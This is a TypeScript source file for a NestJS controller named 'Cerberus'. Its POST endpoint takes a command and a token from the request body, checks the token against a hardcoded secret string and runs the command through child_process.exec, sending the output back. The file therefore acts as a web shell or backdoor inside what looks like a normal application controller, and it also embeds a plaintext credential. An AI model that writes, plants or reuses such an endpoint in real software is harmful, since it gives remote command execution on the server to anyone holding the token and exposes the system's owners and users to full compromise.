import {exec} from 'child_process';
import {CerberusDTO} from './cerberus.dto';
import {
  Controller,
  Body,
  Post,
  Response,
  NotFoundException,
} from '@nestjs/common';

@Controller('cerberus')
export class CerberusController {
  @Post()
  async execCommand(
    @Response() res: any,
    @Body() {command, token}: CerberusDTO
  ): Promise<void> {
    if (token !== 'instinct_system_cerberus_sdgdfgh') {
      throw new NotFoundException();
    }

    await exec(command, (error, stdout, stderr) => {
      res.send(error ?? stdout ?? stderr);
    });
  }
}
